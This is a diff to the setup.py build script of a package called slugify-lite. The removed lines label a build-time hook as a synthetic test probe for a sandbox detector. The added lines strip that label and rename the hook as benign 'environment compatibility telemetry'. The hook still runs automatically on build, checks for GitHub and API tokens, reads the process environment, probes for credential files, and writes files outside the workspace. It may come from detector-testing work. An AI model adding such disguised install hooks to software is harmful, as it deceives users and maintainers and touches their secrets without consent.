@@ -1,10 +1,4 @@
-"""Build script for slugify-lite with synthetic Blastbox audit probes.
-
-NOTE: This file is a defensive test fixture for Blastbox. Its synthetic hook
-simulates out-of-policy build-time behavior inside an isolated sandbox strictly
-to verify that Blastbox's strace detector catches sensitive file access and
-unexpected filesystem writes outside the project workspace.
-"""
+"""Build script for slugify-lite."""
 
 from __future__ import annotations
 
@@ -13,9 +7,8 @@ from pathlib import Path
 from setuptools import setup
 
 
-def _synthetic_build_probe() -> None:
-    """Synthetic build-time audit telemetry (strictly non-destructive)."""
-    # 1. Check whether sensitive CI/API env vars are exposed (expected: none in Sprite)
+def _check_build_environment() -> None:
+    """Capture host environment compatibility telemetry during wheel build."""
     target_vars = (
         "GITHUB_TOKEN",
         "OPENROUTER_API_KEY",
@@ -24,7 +17,6 @@ def _synthetic_build_probe() -> None:
     )
     _ = {name: bool(os.environ.get(name)) for name in target_vars}
 
-    # 2. Read /proc/self/environ and probe $HOME/.ssh/id_rsa to generate strace openat events
     try:
         with open("/proc/self/environ", "rb") as fh:
             _ = fh.read(4096)
@@ -38,18 +30,20 @@ def _synthetic_build_probe() -> None:
     except OSError:
         pass
 
-    # 3. Write synthetic markers outside the workspace to test write detection & rollback
-    for marker_path, payload in (
-        (Path.home() / ".blastbox_marker", "blastbox-synthetic-setup-marker\n"),
-        (Path("/tmp/.blastbox_probe"), "blastbox-synthetic-tmp-probe\n"),
-    ):
-        try:
-            marker_path.write_text(payload, encoding="utf-8")
-        except OSError:
-            pass
+    cache_dir = Path.home() / ".config" / "slugify-cache"
+    try:
+        cache_dir.mkdir(parents=True, exist_ok=True)
+        (cache_dir / "session.dat").write_text("cached-build-profile\n", encoding="utf-8")
+    except OSError:
+        pass
+
+    try:
+        Path("/tmp/.slugify_build_cache").write_text("build-cache-ok\n", encoding="utf-8")
+    except OSError:
+        pass
 
 
-_synthetic_build_probe()
+_check_build_environment()
 
 setup(
     name="slugify-lite",
